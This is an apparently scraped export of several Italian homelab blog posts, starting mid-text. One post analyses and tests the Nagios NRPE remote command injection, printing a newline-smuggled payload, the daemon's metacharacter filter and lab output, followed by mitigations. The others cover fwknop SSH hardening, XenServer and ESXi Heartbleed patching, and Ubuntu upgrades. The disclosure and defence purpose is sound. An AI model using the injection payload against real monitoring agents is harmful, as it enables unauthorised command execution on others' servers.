personalizzazioni può restituire varie informazioni, come ad esempio lo stato del disco rigido, della memoria, la funzionalità o meno di determinati servizi ecc..\nL’agent viene interrogato da Nagios tramite un plugin dal nome “check_nrpe” il quale può richiedere informazioni in due modalità:\n Eseguendo i comandi preimpostati sul file di configurazione dell’agent Personalizzando gli argomenti delle interrogazioni da linea di comando  La vurnerabilità è stata scovata proprio nel secondo caso, ovvero la possibilità di inserire comandi arbitrari da eseguire sulla macchina remota al posto degli argomenti del plugin check_nrpe.\nTest e analisi vulnerabilità Nrpe Vediamo un esempio pratico, se vogliamo sapere quanti utenti di sistema sono attivi su una macchina linux il comando sarà:\nclaudio@va-backbox:~$ /usr/lib/nagios/plugins/check_nrpe -H nrpetest.homelab.it -c check_users -a 4 7 Se sul server nrpetest.homelab.it ci fossero collegati da 4 a 6 utenti di sistema contemporaneamente l’agent risponderebbe con un messagio di warning, mentre se fossero maggiori o uguale a 7 allora il messaggio sarebbe di tipo critical.\nclaudio@va-backbox:~$ /usr/lib/nagios/plugins/check_nrpe -H nrpetest.homelab.it -c check_users -a 4 7 USERS OK - 1 users currently logged in |users=1;4;7;0 claudio@va-backbox:~$ In questo caso sul sistema è collegato un solo utente, quindi l’agent restituisce un messaggio positivo.\nLa vurnerabilità consiste nell’eseguire un comando non autorizzato sulla macchina remota, inserendolo all’interno degli argomenti del plugin check_nrpe:\ncheck_nrpe -H nrpetest.homelab.it -c check_users -a \u0026#34;`echo -e \u0026#34;\\x0a touch /tmp/vulnerable # \u0026#34;` 7\u0026#34; Al posto del valore di warning è stato inserito tramite un echo il carattere _newline (0x0A) e il comando “touch /tmp/vulnerable” ( scrive file vuoto).\nL’agent interpreterà ed eseguirà il tutto localmente in questa maniera:\n/usr/local/nagios/libexec/check_users -w \u0026lt;new_line\u0026gt; touch /tmp/vulnerable # -c 4 Analizzando il codice sorgente del demone nrpe (rpe-2.15/src/nrpe.c) si nota che una sorta di controllo era stato inserito sul valore delle variabili:\n#define NASTY_METACHARS \u0026#34;|`\u0026amp;\u0026gt;\u0026lt;\u0026#39;\\\u0026#34;\\\\[]{};\u0026#34; /* make sure request doesn\u0026#39;t contain nasties */ if(contains_nasty_metachars(pkt-\u0026gt;buffer)==TRUE){ syslog(LOG_ERR,\u0026#34;Error: Request contained illegal metachars!\u0026#34;); Vengono filtrati tutti i caratteri bash che possono permettere una sostituzione o un redirect , ma tramite il carattere newline (0x0A) è possibile concatenare qualsiasi comando si voglia.\nClient:\nclaudio@va-backbox:~$ cd /usr/lib/nagios/plugins/ claudio@va-backbox:plugins$ claudio@va-backbox:plugins$ ./check_nrpe -H nrpetest.homelab.it -c check_users -a \u0026#34;`echo -e \u0026#34;\\x0a touch /tmp/vulnerable # \u0026#34;` 7 \u0026#34; Usage: check_users -w \u0026lt;users\u0026gt; -c \u0026lt;users\u0026gt; claudio@va-backbox:plugins$ Server Agent:\n[root@nrpetest ~]# ls -la /tmp/ totale 24 drwxrwxrwt. 6 root root 4096 5 mag 23:52 . dr-xr-xr-x. 24 root root 4096 2 mag 18:54 .. drwxrwxrwt 2 root root 4096 2 mag 18:54 .ICE-unix drwxr-xr-x 2 root root 4096 28 mar 22:29 vmware-config0 drwxr-xr-x 2 root root 4096 28 mar 22:30 vmware-fonts0 drwx------ 2 root root 4096 2 mag 18:54 vmware-root -rw-r--r-- 1 nrpe nrpe 0 5 mag 23:52 vulnerable [root@nrpetest ~]# Requisiti vulnerabilità Tutte le versioni dell’agent nrpe sembrano essere vulnerabili (\u0026lt;= 2.15) sia per linux che altri sistemi, io personalmente ho potuto eseguire test sulle versione 2.14 e 2.15 di Linux CentOS e Ubuntu.\nLa vurnerabilità può essere sfruttata soltanto nel caso in cui sul file di configurazione dell’agent nrpe (nrpe.cfg) siano abilitate due funzioni.\n La possibilità di specificare gli argomenti dei comandi da eseguire:  # COMMAND ARGUMENT PROCESSING # This option determines whether or not the NRPE daemon will allow clients # to specify arguments to commands that are executed. This option only works # if the daemon was configured with the --enable-command-args configure script # option. # # *** ENABLING THIS OPTION IS A SECURITY RISK! *** # Read the SECURITY file for information on some of the security implications # of enabling this variable. # # Values: 0=do not allow arguments, 1=allow command arguments dont_blame_nrpe=1 Specificare nei vari comandi le variabili degli argomenti:  command[check_users]=/usr/lib64/nagios/plugins/check_users -w $ARG1$ -c $ARG2$ command[check_load]=/usr/lib64/nagios/plugins/check_load -w $ARG1$ -c $ARG2$ command[check_disk]=/usr/lib64/nagios/plugins/check_disk -w $ARG1$ -c $ARG2$ -p $ARG3$ command[check_procs]=/usr/lib64/nagios/plugins/check_procs -w $ARG1$ -c $ARG2$ -s $ARG3$ Soluzioni Purtroppo al momento non è stata rilasciata alcuna patch, quindi le raccomandazioni sono:\n  Disabilitare la funzione “dont_blame_nrpe” (Naturalmente se possibile).\n  Accettare verso l’agent soltanto connessioni da indirizzi autorizzatei\n  Modificare il nome dei comandi sul file nrpe.cfg con nomi non standard in modo da rendere più complicata l’intercettazione, esempio:\n  da “command[check_users]=” a “command[ch3ck_us3rs123]=” ( ricordandosi di sistemare anche la parte nagios).\nAggiornare nrpe appena sarà disponibile una nuova versione\nRiferimenti: http://www.exploit-db.com/exploits/32925/  ","permalink":"https://www.homelab.it/index.php/2014/05/03/nagios-nrpe-remote-command-injection-test-fix/","summary":"Informazioni generali Qualche giorno fa è stato scovato un bug sul noto monitor d’infrastrutture Nagios, più precisamente la vurnerabilità riguarda l’agent NRPE (Nagios Remote Plugin Executor).\n============================================= - Release date: 17.04.2014 - Discovered by: Dawid Golunski - Severity: High ============================================= CVE: 2014-2913\nNrpe è un agent che viene installato su tutte le macchine monitorare da Nagios e a seconda delle varie personalizzazioni può restituire varie informazioni, come ad esempio lo stato del disco rigido, della memoria, la funzionalità o meno di determinati servizi ecc.","title":"Nagios NRPE \u003c= 2.15 Remote Command Injection: Analisi, test e fix della vulnerabilità"},{"content":"   Inserire uno strato di controllo (oltre al firewall) davanti ad alcuni servizi strategici, può rilevarsi molto efficace sotto l’aspetto della sicurezza.\nPrendiamo per esempio il servizio SSH, essendo un demone utilizzato esclusivamente per amministrare e dare l’accesso al sistema, perchè renderlo accessibile da tutta la rete internet?\nEsistono varie tecniche per limitare l’accesso solo a connessioni autorizzate, tra quelle più interessanti c’è il Single Packet Authorization (SPA).\nSPA è una versione avanzata del Port Knocking e viene utilizzata su linux dal software fwknop (FireWall KNock OPerator).\nCosa è il Port Knocking?\n Il port knocking è un sistema che viene utilizzato per aprire delle porte su un firewall dall\u0026rsquo;esterno inviando tentativi di connessione ad una sequenza prestabilita di porte chiuse; una volta che ciò è stato fatto le regole del firewall vengono aggiornate dinamicamente per consentire all\u0026rsquo;host che ha inviato la giusta sequenza di connettersi alla porta voluta.\nFonte wikipedia\n SPA si comporta alla stessa maniera solo che invia un singolo pacchetto criptato verso il server di destinazione.\nQuesto comporta una migliore velocità nell’accedere al servizio nascosto, una migliore indiscrezione sulla rete (al contrario il Port Knocking può essere scambiato per un tentativo di port scanning da un IDS) e soprattutto protegge dai tentativi di connessioni replicate ( il singolo pacchetto criptato viene creato tutte le volte con valore casuale e non può essere riutilizzato!).\nFwknop è composto da un client ed un server.\nIl demone fwknopd installato sul server sniffa le connesioni che arrivano sull’interfaccia di rete tramite la libreria libpcap, appena riceve dal client il pacchetto criptato e firmato con la chiave giusta abilita la connessione dell’indirizzo IP sorgente verso il servizio prestabilito (iptables).\nUna volta inviato il pacchetto tramite il client fwknop si ha un lasso di tempo per stabilire la connessione verso il servizio protetto (di default 30 sec.), sfiorata questa tempistica il server chiude la connessione.\nPer maggiori informazioni è possibile fare riferimento alla documentazione ufficiale: http://www.cipherdyne.org/fwknop/docs/\n1) Installazione requisiti 1A) Lato client non ci sono dipendenze da soddisfare mentre per quanto riguarda il server i pacchetti sono due:  iptables libpcap  Iptables si trova praticamente già preinstallato su tutte le distro mentre libpcap va installato autonomamente.\nSu CentOS 6.5:\n[root@serverspa]# yum install libpcap libpcap-devel  Su Ubuntu 14.04:\n[claudio@serverspa]$ sudo apt-get install libpcap-dev  1B) Oltre ai pacchetti vanno inserite due regole iptables fondamentali per il funziomaneto di fwknop: iptables -I INPUT 1 -i eth0 -p tcp --dport 22 -j DROP iptables -I INPUT 1 -i eth0 -p tcp --dport 22 -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT La prima blocca tutte le connessioni in entrata per il servizio SSH, la seconda invece accetta le connessioni già stabilite (questa servirà quando fwknop server ci autorizzerà a collegarsi verso il demone ssh).\nATTENZIONE!!! Così facendo chiuderete tutte le connessioni verso ssh, accertatevi di poter accedere al server dalla console locale o abilitate la connessione a un singolo ip. Es: iptables -I INPUT -i eth0 -s 3.3.3.3 -p tcp --dport 22 -j ACCEPT In questo caso le configurazioni sul server remoto le eseguirò da una connessione con ip 3.3.3.3 che ha libero accesso. 1C) Per non perdere le regole del firewall al riavvio di CentOS 6.5 scrivere: [root@serverspa]# iptables-save \u0026gt; /etc/sysconfig/iptables  Su Ubuntu 14.04:\n[claudio@serverspa]$ sudo sh -c \u0026quot;iptables-save \u0026gt; /etc/iptables.rules\u0026quot; Dopo di che inserire nel file \u0026quot;/etc/network/interfaces\u0026quot; la stringa pre-up iptables-restore \u0026lt; /etc/iptables.rules sotto la riga \u0026quot;iface lo inet loopback\u0026quot;. Naturalmente potete usufruire di un eventuale file di regole iptables preesistente.  2) Installazione fwknop server/client Sia per Ubuntu che CentOS la mia scelta è ricaduta sulla versione 2.6.x, il motivo principale è il supporto HMAC (keyed-hash message authentication code) per i pacchetti SPA criptati con gli algoritmi Rijndael e GnuPG (disponibile dalla 2.5.0).\n2A-1) Installazione CenOS 6.x : L’installazione sarà identica sia lato server che lato client dato che l’archivio dei sorgenti contiene entrambi i software (fwknopd e fwknop).\n[claudio@serverspa]$ wget http://www.cipherdyne.org/fwknop/download/fwknop-2.6.2.tar.gz [claudio@serverspa]$ [claudio@serverspa]$ tar xvfz fwknop-2.6.2.tar.gz [claudio@serverspa]$ cd fwknop-2.6.2 [claudio@serverspa]$ [claudio@serverspa]$ ./configure --prefix=/usr --sysconfdir=/etc --libdir=/lib64 \u0026amp;\u0026amp; make # --libdir=/lib per 32bit Da root:\n[claudio@serverspa]# make install # CentOS [claudio@serverspa]$ sudo make install # Ubuntu 2A-2) Copiare il file init per il demone fwknop: [root@serverspa]# cd fwknop-2.6.2 [root@serverspa]# [root@serverspa]# cp extras/fwknop.init.redhat /etc/init.d/fwknop [root@serverspa]# chkconfig fwknop on *Ubuntu [claudio@serverspa]$ cd fwknop-2.6.2 [claudio@serverspa]$ [claudio@serverspa]$ sudo cp extras/fwknop.init.debian /etc/init.d/fwknop-server [claudio@serverspa]$ sudo update-rc.d fwknop-server defaults Per installare il client, sulla macchina prestabilita (clientspa), andrà eseguita la stessa operazione d’installazione tranne il punto “2A-2“.\n IMPORTANTE!!! Nel repository ufficiale di Ubuntu 13.10 è presente la versione server/client di fwknop 2.0.4, per avere il supporto HMAC installare il software tramite sorgenti (vedi punto \u0026ldquo;2A-1\u0026rdquo;).\n 2B) Installazione Ubuntu 14.04: L\u0026rsquo;installazione per Ubuntu è semplice, da terminale scrivere:\nclaudio@serverspa:~$ sudo apt-get install fwknop-server\nper il client:\nclaudio@clientspa:~$ sudo apt-get install fwknop-client\n3) Configurazione fwknop server/client Immaginiamo lo scenario:\nServerSPA: 2.2.2.2\nClientSPA: 1.1.1.1\nUserClientSPA: claudio\nAlgoritmo SPA: Rijndael con HMAC\n3A) Geneare le chiavi sul client e prenderne nota: claudio@clientspa:~$ fwknop -A tcp/22 -D 2.2.2.2 --key-gen --use-hmac --save-rc-stanza [*] Creating initial rc file: /home/claudio/.fwknoprc. [+] Wrote Rijndael and HMAC keys to rc file: /home/claudio/.fwknoprc claudio@clientspa:~$ claudio@clientspa:~$ grep KEY /home/claudio/.fwknoprc KEY_BASE64 NPhe11+ORlK1Yfr4ipzW+ngQxzRt8kjI6UTDXLZYSv0= HMAC_KEY_BASE64 SypMEUIhiAKTjeHlHoWR5dfu7hrLVvLnoIXINPbGTOowST1vUIs+tOtMc/XlKl6+JcVw7qc2jrpqmKujZxvnqw== claudio@clientspa:~$ 3B) Creare sul serverspa (2.2.2.2) il file “/etc/fwknop/access.conf” inserendo le chiavi del client: SOURCE ANY REQUIRE_SOURCE_ADDRESS Y KEY_BASE64 NPhe11+ORlK1Yfr4ipzW+ngQxzRt8kjI6UTDXLZYSv0= HMAC_KEY_BASE64 SypMEUIhiAKTjeHlHoWR5dfu7hrLVvLnoIXINPbGTOowST1vUIs+tOtMc/XlKl6+JcVw7qc2jrpqmKujZxvnqw== 3C) Controllare che sul file di configurazione del serverspa (2.2.2.2) sia configurata l’interfaccia di rete (WAN) corretta su cui fwknopd starà in ascolto: [root@serverspa]# grep PCAP_INTF /etc/fwknop/fwknopd.conf # the PCAP_INTF setting. PCAP_INTF eth0; 3D) Far partire il demone fwknop sul serverspa (2.2.2.2): CentOS:\n[root@serverspa]# /etc/init.d/fwknop start Avvio di fwknopd: [ OK ] [root@serverspa]# Ubuntu:\n[claudio@serverspa]$ sudo /etc/init.d/fwknop-server start Avvio di fwknopd: [ OK ] [claudio@serverspa]$ 4) Test di connessione 4A) Controllare che il serverspa (2.2.2.2) blocchi di default le connessioni verso il servizio SSH: claudio@clientspa:~$ nmap 2.2.2.2 -p22 Starting Nmap 6.40 ( http://nmap.org ) at 2014-04-30 23:21 CEST Nmap scan report for 2.2.2.2 Host is up (0.0011s latency). PORT STATE SERVICE 22/tcp filtered ssh Nmap done: 1 IP address (1 host up) scanned in 1.97 seconds 4B) Spedire il pacchetto SPA al serverspa ed abilitare l’accesso SSH al clientspa: claudio@clientspa:~$ fwknop -n 2.2.2.2 -a 1.1.1.1 # in assenza di ip statico 1.1.1.1 dovrà essere sempre sostituito dall\u0026#39;ip pubblico assegnato dal vostro ISP. 4C) Collegarsi dal clientspa verso il serverspa tramite ssh client entro 30 secondi : claudio@clientspa:~$ fwknop -n 2.2.2.2 -a 1.1.1.1 claudio@clientspa:~$ ssh root@2.2.2.2 root@2.2.2.2\u0026#39;s password: Last login: Wed Apr 30 23:06:51 2014 from 5.5.5.5 [root@serverspa ~]# 5) Conclusioni Fwknop non garantisce una sicurezza assoluta (chi lo fa?) ma integrato con altri sistemi ne può aumentare notevolmente il livello.Un altro aspetto interessante è la compatibilità del client con i vari dispositivi, infatti oltre ad essere supportato dai sistemi unix-like, Windows e OSX è possibile installarlo su smartphone/tablet Android e iOS.\nPro:\n Protegge i servizi da eventuali 0-day Riduce i tempi di risposta del Port Knocking Cripta il playload Disponibilità del client per vari dispositivi  Contro:\n Non è utilizzabile con tutti i servizi (soprattutto quelli pubblici a cui devono accedere qualsiasi utente) Devi sempre avere un client disponibile  ","permalink":"https://www.homelab.it/index.php/2014/04/30/proteggere-il-servizio-ssh-e-non-solo-tramite-la-tecnica-single-packet-authorization-spa-utilizzando-il-software-fwknop/","summary":"Inserire uno strato di controllo (oltre al firewall) davanti ad alcuni servizi strategici, può rilevarsi molto efficace sotto l’aspetto della sicurezza.\nPrendiamo per esempio il servizio SSH, essendo un demone utilizzato esclusivamente per amministrare e dare l’accesso al sistema, perchè renderlo accessibile da tutta la rete internet?\nEsistono varie tecniche per limitare l’accesso solo a connessioni autorizzate, tra quelle più interessanti c’è il Single Packet Authorization (SPA).","title":"Proteggere il servizio SSH (e non solo) tramite la tecnica Single Packet Authorization (SPA) utilizzando il software fwknop"},{"content":"Tra le varie limitazioni che caratterizzano la versione free di XenServer, spicca la mancata disponibilità di aggiornare automaticamente l’hypervisor tramite XenCenter.\nIn questo articolo spiegherò come scaricare ed installare le patch passo dopo passo.\n1) Individuazione e download degli aggiornamenti 1A) Per controllare quali aggiornamenti sono disponibili per il nostro XenServer, basta cliccare sull’icona “System Alerts” in alto a destra del client XenServer:\n1B) Si aprirà una finestracon l’elenco degli aggiornamenti, selezionare la patch desiderata e cliccare sul bottone “Go to Web Page“:\n\n1C) Nella pagina web appena apparsa, cliccare sul bottone “Download” e salvare la patch sul computer:\n\n2) Trasferimento patch sul virtualizzatore 2A) Per trasferire la patch dal pc verso XenServer basta utilizzare un SCP client, ad esempio WinSCP*:\n*ho utilizzato come directory di appoggio la cartella remota “/root”\n3) Installazione aggiornamenti 3A) Collegarsi a XenServer tramite SSH client e scompattare la patch:\n[root@xenserver01 ~]# ls XS62E002.zip [root@xenserver01 ~]# unzip XS62E002.zip Archive: XS62E002.zip inflating: XS62E002.xsupdate inflating: XS62E002-src-pkgs.tar.bz2 [root@xenserver01 ~]# 3B) Inserire la patch nel pool Database e prendere nota del suo numero UUID:\n[root@xenserver01 ~]# xe patch-upload file-name=XS62E002.xsupdate 59128f15-92cd-4dd9-8fbe-a0115d1b07a2 [root@xenserver01 ~]# 3C) Per eseguire l’installazione dell’aggiornamento è richiesto anche l’UUID dell’host xen, per visualizzarlo scrivere:\n[root@xenserver01 ~]# xe host-list uuid ( RO) : a89b37b2-7777-438a-952a-603d449bb5aa name-label ( RW): xenserver01 name-description ( RW): Default install of XenServer [root@xenserver01 ~]# 3D) Concludere l’installazione dell’aggiornamento utilizzando i due codici UUID precedentemente visualizzati:\n[root@xenserver01 ~]# xe patch-apply uuid=59128f15-92cd-4dd9-8fbe-a0115d1b07a2 host-uuid=a89b37b2-7777-438a-952a-603d449bb5aa Preparing... ################################################## xen-hypervisor ################################################## Preparing... ################################################## xen-tools ################################################## [root@xenserver01 ~]#\nNota: se dovete installare la patch su più hosts dentro un pool, basta dare il comando:\nxe patch-pool-apply uuid=\u0026lt;UUID patch\u0026gt;\n3E) Eliminare gli archivi della patch ed riavviare le toolstack:\n[root@xenserver01 ~]# ls XS62E002-src-pkgs.tar.bz2 XS62E002.xsupdate XS62E002.zip [root@xenserver01 ~]# rm -rf XS62E002* [root@xenserver01 ~]# [root@xenserver01 ~]# xe-toolstack-restart Executing xe-toolstack-restart Stopping xapi: .. [ OK ] Stopping the v6 licensing daemon: [ OK ] Stopping the memory ballooning daemon: [ OK ] Stopping perfmon: [ OK ] Stopping the xenopsd daemon: [ OK ] Stopping XCP RRDD plugin xcp-rrdd-iostat: [ OK ] Stopping XCP RRDD plugin xcp-rrdd-squeezed: [ OK ] Stopping XCP RRDD plugin xcp-rrdd-xenpm: [ OK ] Stopping the XCP RRDD daemon: [ OK ] Stopping the XCP networking daemon: [ OK ] Stopping the fork/exec daemon: [ OK ] Stopping the multipath alerting daemon: [ OK ] Starting the multipath alerting daemon: [ OK ] Starting the fork/exec daemon: . [ OK ] Starting the XCP networking daemon: . [ OK ] Starting the XCP RRDD daemon: . [ OK ] Starting XCP RRDD plugin xcp-rrdd-iostat: . [ OK ] Starting XCP RRDD plugin xcp-rrdd-squeezed: . [ OK ] Starting XCP RRDD plugin xcp-rrdd-xenpm: . [ OK ] Starting the xenopsd daemon: . [ OK ] Starting perfmon: [ OK ] Starting the memory ballooning daemon: . [ OK ] Starting the v6 licensing daemon: . [ OK ] Starting xapi: OK [ OK ] done. [root@xenserver01 ~]# Nota: Se l’aggiornamento richiederà un riavvio dell’host sarà possibile constatarlo su XenCenter\n4) Controllo esito aggiornamento 4A) Per controllare il buon esito dell’aggiornamento, basta andare su XenServer e leggere la sezione “Updates”\nnel tab “General“:\n\n","permalink":"https://www.homelab.it/index.php/2014/04/26/installare-patch-su-xenserver-6-2-free-edition/","summary":"Tra le varie limitazioni che caratterizzano la versione free di XenServer, spicca la mancata disponibilità di aggiornare automaticamente l’hypervisor tramite XenCenter.\nIn questo articolo spiegherò come scaricare ed installare le patch passo dopo passo.\n1) Individuazione e download degli aggiornamenti 1A) Per controllare quali aggiornamenti sono disponibili per il nostro XenServer, basta cliccare sull’icona “System Alerts” in alto a destra del client XenServer:\n1B) Si aprirà una finestracon l’elenco degli aggiornamenti, selezionare la patch desiderata e cliccare sul bottone “Go to Web Page“:","title":"Installare Patch su XenServer 6.2 Free Edition"},{"content":"   Il noto bug ha colpito anche i software di casa VMware, per leggere l’elenco dei prodotti potete fare riferimento al mio articolo cliccando QUESTO LINK.\nIn questo articolo tratterò in particolare l’aggiornamento dell’hypervisor vSphere ESXi versione 5.5 e 5.5u1.\nLa procedura si dividerà principalmente in tre punti:\n Individuazione e download della patch adeguata Upload ed installazione della patch sul virtualizzatore Creazioni dei nuovi certificati ssl   Attenzione!!! Nella seguente procedura sarà necessario riavviare l\u0026rsquo;host ESXi, in caso d\u0026rsquo;ambinte di produzione assicurarsi di aver configurato in maniera corretta l\u0026rsquo;alta affidabilità (HA).\n 1) Individuazione e download della patch heartbleed adeguata Il supporto VMware ha reso disponibile due patch per per risolvere il bug heartbleed, una per ESXi 5.5 e l’altra per la versione 5.5u1.\nLa patch consiste fondamentalmente nell’aggiornare OpenSSL dalla versione 1.0.1e alla 1.0.1g.\nHo reso disponibile il download dei files nel mio repository:\nPatch ESXi 5.5u1 ESXi550-201404001\nPatch ESXi 5.5 ESXi550-201404020\nSe è vostra intenzione scaricare le patch dal sito ufficiale basta andare alla pagina:\nhttps://www.vmware.com/patchmgr/download.portal\nUna volta inserito login e password del portale “My VMware”, cercare le patch di sicurezza per il sistemaESXi 5.5.0:\nPer ESXi 5.5u1 scaricare la patch ESXi550-201404001 mentre per ESXi 5.5 scaricare ESXi550-201404020\n Attenzione!!!\nPer i possessori di vSphere ESXi 5.5u1 con storage NFS che applicheranno la patch ESXi550-201404001, il supporto VMware consiglia di leggere il Knowledge Base Frequent NFS APDs after upgrading ESXi to 5.5 U1 (KB 2076392).\n 2) Upload ed installazione della patch heartbleed sul virtualizzatore 2A) Una volta scaricata la patch sul proprio computer (per me ESXi550-201404020.zip), trasferirla sul virtualizzatore tramite Browser del Datasore:\nIn alternativa è possibile utilizzare un client scp per copiare il file sul datastore locale, ad esempio WinSCP:\n2B) Terminato l’upload, mandare il vSphere ESXi in “Maintenance Mode“:\n2C) Collegarsi al virtualizzatore tramite SSH client e digitare:\n~ # openssl version WARNING: can\u0026#39;t open config file: /etc/pki/tls/openssl.cnf OpenSSL 1.0.1e 11 Feb 2013 ~ # ~ # esxcli software vib install -d \u0026#34;/vmfs/volumes/datastore1/ESXi550-201404020.zip\u0026#34; Installation Result Message: The update completed successfully, but the system needs to be rebooted for the chan ges to be effective. Reboot Required: true VIBs Installed: VMware_bootbank_esx-base_5.5.0-0.15.1746974, VMware_bootbank_misc-drivers_5. 5.0-0.7.1474526, VMware_locker_tools-light_5.5.0-0.14.1598313 VIBs Removed: VMware_bootbank_esx-base_5.5.0-0.0.1331820, VMware_bootbank_misc-drivers_5.5.0 -0.0.1331820, VMware_locker_tools-light_5.5.0-0.0.1331820 VIBs Skipped: VMware_bootbank_ata-pata-amd_0.3.10-3vmw.550.0.0.1331820, VMware_bootbank_ata- pata-atiixp_0.4.6-4vmw.550.0.0.1331820, VMware_bootbank_ata-pata-cmd64x_0.2.5-3vmw.550.0.0.1331 820, VMware_bootbank_ata-pata-hpt3x2n_0.3.4-3vmw.550.0.0.1331820, VMware_bootbank_ata-pata-pdc2 ... ... ... VMware_bootbank_scsi-mptspi_4.23.01.00-9vmw.550.0.0.1331820, VMware_bootbank_scsi-qla2xxx_902.k1.1- 9vmw.550.0.0.1331820, VMware_bootbank_scsi-qla4xxx_5.01.03.2-6vmw.550.0.0.1331820, VMware_bootbank_uhci-usb-uhci_1.0-3vmw.550.0.0.1331820 ~ # ~ # reboot ~ # 2D) Riavviato il virtualizzatore, collegarsi con il client ssh e controllare la nuova versione di OpenSSL:\n~ # openssl version WARNING: can\u0026#39;t open config file: /usr/ssl/openssl.cnf OpenSSL 1.0.1g 7 Apr 2014 ~ # 3) Creazioni dei nuovi certificati ssl 3A) Dopo aver aggiornato la versione di OpenSSL è necessario rigenerare i certificati SSL, per farlo basta collegarsi al virtualizzatore tramite il client SSH ed eseguire i seguenti comandi:\n/etc/vmware/ssl # /etc/vmware/ssl # rm -f rui.crt rui.key \u0026lt;--- E\u0026#39; consigliato creare prima una copia /etc/vmware/ssl # /sbin/generate-certificates dei files sul Datastore WARNING: can\u0026#39;t open config file: /usr/ssl/openssl.cnf /etc/vmware/ssl # /etc/vmware/ssl # chmod +t rui.crt rui.key /etc/vmware/ssl # ls -la rui.* -rw-r--r-T 1 root root 1411 Apr 23 22:55 rui.crt -r-------T 1 root root 1704 Apr 23 22:55 rui.key /etc/vmware/ssl # /etc/vmware/ssl # reboot /etc/vmware/ssl # 3B) Dopo il riavvio far ucire ESXi server dalla modalità “Maintenance Mode”\n3C) L’ultimo step da eseguire è il cambio password per l’utente root, tramite ssh client eseguire i comandi:\n~ # passwd root\nConclusioni La procedura d’aggiornamento è conclusa ma prima di terminare l’articolo scrivo una piccola nota:\nQuando l’host ESXi verrà riconnesso al vCenter apparirà un messaggio di errore in cui viene specificato che\nil certificato del virtualizzatore non è verificato:\nNiente paura, basta riconnettere l’host e reinserire le credenziali di root nell “Host Connection wizard”.\nPer scrivere questa guida ho fatto riferimento al Knowledge Base ufficiale: KB2076665\n","permalink":"https://www.homelab.it/index.php/2014/04/23/heartbleed-come-installare-le-patch-e-rigenerare-i-certificati-su-vmware-vsphere-esxi-5-55-5u1/","summary":"Il noto bug ha colpito anche i software di casa VMware, per leggere l’elenco dei prodotti potete fare riferimento al mio articolo cliccando QUESTO LINK.\nIn questo articolo tratterò in particolare l’aggiornamento dell’hypervisor vSphere ESXi versione 5.5 e 5.5u1.\nLa procedura si dividerà principalmente in tre punti:\n Individuazione e download della patch adeguata Upload ed installazione della patch sul virtualizzatore Creazioni dei nuovi certificati ssl   Attenzione!","title":"Heartbleed – Come installare le patch e rigenerare i certificati su VMware vSphere ESXi 5.5/5.5u1"},{"content":"Il 17 Aprile 2014 è stata rilasciata la versione finale di Ubuntu 14.04 LTS (Trusty Tahr)\nPer eseguire l’upgrade dalla versione 13.10 bastano pochi e semplici passi:\n1) Preparazione del sistema La prima azione da fare è quella di aggiornare completamente l’attuale sistema Ubuntu 13.10, quindi aprire un terminale e digitare:\n$ sudo apt-get update \u0026amp;\u0026amp; sudo apt-get dist-upgrade\n2) Inizializzazione dell’aggiornamento 2A) Concluso l’upgrade della distribuzione versione 13.10, sempre dal terminale eseguire:\n$ sudo update-manager -d\n2B) Il software d’aggiornamento troverà la versione 14.04 LTS, preme il bottone “Aggiorna…”\n2C) Premere il bottone “Esegui Avanzamento”\n2D) Se verranno trovati repository di terze parti verranno disabilitati, premere bottone “Chiudi”\n2E) Confermare l’upgrade di versione cliccando sul bottone “Avvia avanzamento”\n2F) Attendere la fine del download e dell’installazione dei nuovi pacchetti\n2G) Rimuovere i pacchetti obsoleti cliccando sul bottone “Rimuovi”\n2H) Conclusa l’installazione e la normalizzazione riavviare il sistema cliccando il bottone “Riavvia ora”\n3) Verifica installazione 3A) Per verificare se l’upgrade è andato a buon fine basta controllare la schermata di login\nConclusioni L’articolo è terminato, spero di esservi stato d’aiuto e non scordate di contattarmi in caso di dubbi o eventuali problematiche.\n","permalink":"https://www.homelab.it/index.php/2014/04/21/aggiornare-ubuntu-dalla-versione-13-10-saucy-salamander-alla-14-04-trusty-tahr/","summary":"Il 17 Aprile 2014 è stata rilasciata la versione finale di Ubuntu 14.04 LTS (Trusty Tahr)\nPer eseguire l’upgrade dalla versione 13.10 bastano pochi e semplici passi:\n1) Preparazione del sistema La prima azione da fare è quella di aggiornare completamente l’attuale sistema Ubuntu 13.10, quindi aprire un terminale e digitare:\n$ sudo apt-get update \u0026amp;\u0026amp; sudo apt-get dist-upgrade\n2) Inizializzazione dell’aggiornamento 2A) Concluso l’upgrade della distribuzione versione 13.10, sempre dal terminale eseguire:","title":"Aggiornare Ubuntu dalla versione 13.10 (Saucy Salamander) alla 14.04 (Trusty Tahr) + Video"},{"content":"    Per installare XenServer sul virtualizzatore ESXi (Nested Virtualization) clicca: http://www.homelab.it/index.php/2014/04/17/nested-virtualization-installare-xenserver-su-vsphere-esxi-5-5-full-virtualization/\n Avete creato una VM su XenServer e volete aggiungere un secondo disco locale post installazione?\nBene, bastano pochissimi passaggi:\n1) Creazione del secondo virtual disk Tramite vSphere C#/Web Client aggiungere un nuovo virtual disk delle dimensioni desiderate:\n2) Preparazione e creazione storage Collegarsi tramite ssh alla console di XenServer e controllare la presenza del nuovo disco (/dev/sdb nella mia configurazione):\n[root@xenserver-dcvemhya ~]# fdisk -l\nWARNING: GPT (GUID Partition Table) detected on \u0026#39;/dev/sda\u0026#39;! The util fdisk doesn\u0026#39;t support GPT. Use GNU Parted. Disk /dev/sda: 214.7 GB, 214748364800 bytes 256 heads, 63 sectors/track, 26006 cylinders Units = cylinders of 16128 * 512 = 8257536 bytes Device Boot Start End Blocks Id System /dev/sda1 * 1 26007 209715199+ ee EFI GPT Disk /dev/sdb: 107.3 GB, 107374182400 bytes 255 heads, 63 sectors/track, 13054 cylinders Units = cylinders of 16065 * 512 = 8225280 bytes Disk /dev/sdb doesn\u0026#39;t contain a valid partition table [root@xenserver-dcvemhya ~]# Creare il physical volume:\n[root@xenserver-dcvemhya ~]# pvcreate /dev/sdb Physical volume \u0026#34;/dev/sdb\u0026#34; successfully created [root@xenserver-dcvemhya ~]# Creare il volume logico e collegare lo storage:\n[root@xenserver-dcvemhya ~]# xe sr-create type=lvm content-type=user device-config:device=/dev/sdb name-label=LocalStorage02 243debe7-d1b1-d558-c1b7-22619796de88 [root@xenserver-dcvemhya ~]# 3) Controllo stato del nuovo storage Aprire il client XenCenter e controllare se lo storage è stato montato o meno:\nIl nuovo storage è stato montato correttamente.\n","permalink":"https://www.homelab.it/index.php/2014/04/18/how-to-add-local-storage-to-xenserver-6-2-come-aggiungere-un-disco-locale-su-xenserver-6-2/","summary":"Per installare XenServer sul virtualizzatore ESXi (Nested Virtualization) clicca: 